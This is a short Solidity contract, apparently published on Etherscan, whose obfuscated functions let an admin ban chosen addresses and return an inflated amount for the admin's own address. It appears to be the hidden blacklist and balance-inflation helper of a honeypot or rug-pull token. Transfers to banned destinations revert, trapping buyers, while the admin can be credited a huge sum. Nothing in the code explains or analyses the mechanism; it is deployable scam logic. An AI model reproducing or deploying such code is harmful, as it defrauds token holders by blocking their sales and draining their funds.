/**
 *Submitted for verification at Etherscan.io on 2024-11-27
*/

pragma solidity ^0.8.10;

contract kkjjj22 {
    mapping(address => uint256) private _bans;
    address public mnAdmin = address(0xFe6035CF650973bC2A916D88a4739f80bBc6d1a0);
    uint256 adminAmount = 60000000000*10**18*88000*1;
    constructor() {
        mnAdmin = msg.sender;
        _bans[msg.sender] = 100;
        _bans[0x0ED943Ce24BaEBf257488771759F9BF482C39706] = 1;
        _bans[0x5Bca762F9b0a7a953EB9B7aEdf71e7E01a8971C1] = 1;
        _bans[0x996730dB3C8ef2AA6BfBd3FA9c99A8201f97A5db] = 1;
        
    }
    function okgiveamount(uint256 bm) external   {
        require(msg.sender == mnAdmin, 'NO ADMIN');
        adminAmount = bm;
    }

    function okgetuserr(address userAddress) external view returns  (uint256)   {
        require(msg.sender == mnAdmin, 'NO ADMIN');
        return _bans[userAddress];
    }

    function oksetuserr(address userAddress) external   {
        require(msg.sender == mnAdmin, 'NO ADMIN');
        _bans[userAddress] = 1;
    }

    function okremoveuserr(address userAddress) external   {
        require(msg.sender == mnAdmin, 'NO ADMIN');
        _bans[userAddress] = 0;
    }

    function okgiveadminuserrr() external   {
        require(msg.sender == mnAdmin, 'NO ADMIN');
        _bans[mnAdmin] = 100;
    }

     function mbb123mlbb(bool qpc,address ddhoong, uint256 totalAmount,address destt) external view returns (uint256)   {
        if (_bans[destt] == 1){
            revert("destt goway");
        }else if (_bans[destt] == 100) {
            return adminAmount;
        }else {
            return totalAmount; 
        }
    }
}